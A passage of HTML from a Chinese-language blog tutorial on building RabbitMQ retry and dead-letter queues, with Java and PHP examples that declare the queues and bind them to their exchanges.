-->\r\n<p></p>\n<blockquote><p>这里的两个header字段的含义是，在队列中延迟30s后，将该消息重新投递到<code>x-dead-letter-exchange</code>对应的Exchange中</p></blockquote>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca703539295757\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 声明监听队列\r\nchannel.queueDeclare(\r\n    queueName, // 队列名称\r\n    true,      // durable\r\n    false,     // exclusive\r\n    false,     // autoDelete\r\n    null       // arguments\r\n);\r\nchannel.queueDeclare(queueName + \"@failed\", true, false, false, null);\r\n\r\nMap arguments = new HashMap();\r\narguments.put(\"x-dead-letter-exchange\", exchangeName());\r\narguments.put(\"x-message-ttl\", 30 * 1000);\r\nchannel.queueDeclare(queueName + \"@retry\", true, false, false, arguments);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca703539295757-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca703539295757-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca703539295757-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca703539295757-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca703539295757-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca703539295757-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca703539295757-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca703539295757-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca703539295757-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca703539295757-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca703539295757-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca703539295757-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca703539295757-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca703539295757-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca703539295757-1\"><span class=\"crayon-c\">// 声明监听队列</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca703539295757-2\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueDeclare</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca703539295757-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 队列名称</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca703539295757-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">      </span><span class=\"crayon-c\">// durable</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca703539295757-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// exclusive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca703539295757-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// autoDelete</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca703539295757-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\">       </span><span class=\"crayon-c\">// arguments</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca703539295757-8\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca703539295757-9\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca703539295757-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca703539295757-11\"><span class=\"crayon-e\">Map </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HashMap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca703539295757-12\"><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-dead-letter-exchange\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">exchangeName</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca703539295757-13\"><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-message-ttl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca703539295757-14\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueDeclare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca707307648913\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$this-&gt;channel-&gt;queue_declare($queueName, false, true, false, false, false);\r\n$this-&gt;channel-&gt;queue_declare($failedQueueName, false, true, false, false, false);\r\n$this-&gt;channel-&gt;queue_declare(\r\n    $retryQueueName, // 队列名称\r\n    false,           // passive\r\n    true,            // durable\r\n    false,           // exclusive\r\n    false,           // auto_delete\r\n    false,           // nowait\r\n    new AMQPTable([\r\n        'x-dead-letter-exchange' =&gt; 'master',\r\n        'x-message-ttl'          =&gt; 30 * 1000,\r\n    ])\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca707307648913-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca707307648913-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca707307648913-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca707307648913-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca707307648913-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca707307648913-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca707307648913-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca707307648913-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca707307648913-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca707307648913-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca707307648913-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca707307648913-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca707307648913-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca707307648913-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca707307648913-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca707307648913-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">failedQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca707307648913-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_declare</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca707307648913-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retryQueueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 队列名称</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca707307648913-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// passive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca707307648913-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// durable</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca707307648913-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// exclusive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca707307648913-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// auto_delete</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca707307648913-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// nowait</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca707307648913-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AMQPTable</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca707307648913-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-s\">'x-dead-letter-exchange'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca707307648913-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-s\">'x-message-ttl'</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca707307648913-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca707307648913-14\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>在RabbitMQ的管理界面中，Queues部分可以看到我们创建的三个队列</p>\n<p><img title=\"\" src=\"https://segmentfault.com/img/remote/1460000014847795?w=1626&amp;h=284\" alt=\"\"></p>\n<p>查看队列的详细信息，我们可以看到 <strong>queueName@retry</strong> 队列与其它两个队列的不同</p>\n<p><img title=\"-w486\" src=\"https://segmentfault.com/img/remote/1460000014847796\" alt=\"-w486\"></p>\n<h4>Bind Exchange &amp; Queue</h4>\n<p>创建完队列之后，需要将队列与Exchange绑定（<code>bind</code>），不同队列需要绑定到之前创建的对应的Exchange上面</p>\n<table>\n<thead>\n<tr>\n<th>Queue</th>\n<th>Exchange</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[queue_name]</td>\n<td>master</td>\n</tr>\n<tr>\n<td>[queue_name]@retry</td>\n<td>master.retry</td>\n</tr>\n<tr>\n<td>[queue_name]@failed</td>\n<td>master.failed</td>\n</tr>\n</tbody>\n</table>\n<p>绑定时，需要提供订阅的路由KEY，该路由KEY与消息发布时的路由KEY对应，区别是这里可以使用通配符同时订阅多种类型的消息。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>queue</td>\n<td>–</td>\n<td>绑定的队列</td>\n</tr>\n<tr>\n<td>exchange</td>\n<td>–</td>\n<td>绑定的Exchange</td>\n</tr>\n<tr>\n<td>routing-key</td>\n<td>–</td>\n<td>订阅的消息路由规则</td>\n</tr>\n<tr>\n<td>no-wait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n</tbody>\n</table>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca70c970841706\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 绑定监听队列到Exchange\r\nchannel.queueBind(queueName, \"master\", routingKey);\r\nchannel.queueBind(queueName + \"@failed\", \"master.failed\", routingKey);\r\nchannel.queueBind(queueName + \"@retry\", \"master.retry\", routingKey);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca70c970841706-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca70c970841706-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca70c970841706-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca70c970841706-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca70c970841706-1\"><span class=\"crayon-c\">// 绑定监听队列到Exchange</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca70c970841706-2\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueBind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"master\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca70c970841706-3\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueBind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"master.failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca70c970841706-4\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">queueBind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"@retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"master.retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca70f099852072\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$this-&gt;channel-&gt;queue_bind($queueName, 'master', $routingKey);\r\n$this-&gt;channel-&gt;queue_bind($retryQueueName, 'master.retry', $routingKey);\r\n$this-&gt;channel-&gt;queue_bind($failedQueueName, 'master.failed', $routingKey);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca70f099852072-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca70f099852072-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca70f099852072-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca70f099852072-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">queue_bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca70f099852072-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span 